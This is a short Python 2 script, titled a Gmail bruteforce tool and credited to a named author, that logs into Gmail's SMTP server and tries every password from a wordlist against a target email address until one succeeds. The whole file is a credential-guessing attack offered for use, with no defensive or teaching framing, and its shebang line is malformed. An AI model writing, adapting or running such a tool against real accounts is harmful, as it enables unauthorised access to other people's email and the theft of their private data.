#!usr/bin/env/python
#gmail bruteforce

import smtplib

print("TOOL IS CREATED BY KRISNA PRANAV")
print("Github Link https://www.github.com/krishpranav")
print("Do Not Forget To Follow Me :) :) :)")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Is Not In The List: %s" % password